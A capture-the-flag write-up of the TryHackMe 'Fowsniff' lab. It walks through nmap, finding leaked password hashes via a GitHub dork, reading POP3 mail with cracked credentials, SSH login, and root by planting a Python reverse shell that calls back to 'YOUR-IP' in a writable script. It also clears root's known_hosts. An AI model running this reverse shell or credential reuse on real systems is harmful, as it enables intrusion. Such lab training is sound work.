Fowsniff (TryHackMe)

Writeup · POP3 Exploitation → Credential Discovery → Privilege Escalation · by Svfear
Nmap Website Recon GitHub Leak POP3 Enumeration SSH Access Privilege Escalation Root
Summary: Found leaked credentials via GitHub, cracked hashes, authenticated through POP3 to retrieve internal emails revealing SSH credentials, then gained shell and privilege escalation through a vulnerable script.

Nmap

Initial scan for open services:

nmap -sV -sS -sC 10.10.147.226 -oN nmap.txt

Discovered four open ports: 22 (SSH), 80 (HTTP), 110 (POP3), and 143 (IMAP).

Website Recon

Checked the web server and found a notice about a data breach. This hinted that sensitive data might be publicly leaked.

GitHub Leak Discovery

Used Google Dorking to find any references to fowsniff on GitHub:

site:"github.com" "fowsniff"

Found a repository containing usernames and hashed passwords:

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
...
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Created users.txt and passwords.txt lists to attempt password cracking.

POP3 Enumeration & Exploitation

Since port 110 (POP3) was open, attempted login using cracked credentials. Metasploit confirmed a valid login:

seina:scoobydoo2

Connected manually using nc to read emails:

nc 10.10.147.226 110
USER seina
PASS scoobydoo2
LIST
RETR 1

Inside the first email, found a leaked SSH password:

The temporary password for SSH is "S1ck3nBluff+secureshell"

SSH Access

ssh baksteen@10.10.147.226
Password: S1ck3nBluff+secureshell

Gained access as baksteen (non-root). Next, privilege escalation.

Privilege Escalation

Enumerated files owned by the users group:

find / -group users -type f 2>/dev/null
/opt/cube/cube.sh

Replaced the contents of cube.sh with a reverse shell payload:

#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR-IP",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'

Before exiting, started a listener and cleared known hosts:

echo "" > /root/.ssh/known_hosts

Root Shell

Successfully obtained a root shell and completed the challenge. 🎯
